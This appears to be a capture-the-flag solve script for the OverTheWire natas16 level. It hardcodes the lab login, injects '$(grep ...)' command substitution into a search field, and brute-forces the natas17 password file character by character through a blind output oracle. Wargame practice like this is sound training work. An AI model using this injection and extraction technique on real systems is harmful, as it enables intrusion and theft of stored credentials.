import requests
import re

URL = "http://natas16.natas.labs.overthewire.org"
user = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
characters = 'abcdefghijklmnopqrstuvwxyz'\
            'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\
            '0123456789'

#command = "$(echo hello)"

#command = "doom$( grep ^  /etc/natas/web_pass/natas16 )"

session = requests.Session()
response = session.get(URL, auth = (user,password))
print "First test get request"
print response.text

seen_password = list()
for _ in range(32):
    
    for character in characters:
        
        #print "".join(seen_password) + character
        
        response = session.post(URL, data = { "needle" : "anythings$(grep ^" + "".join(seen_password) + character + " /etc/natas_webpass/natas17)" },auth = (user, password) )
        content = response.text
        returned = re.findall( '<pre>\n(.*)\n</pre>', content )
        if ( not returned ):
            seen_password.append( character )
            break        

print "".join(seen_password)
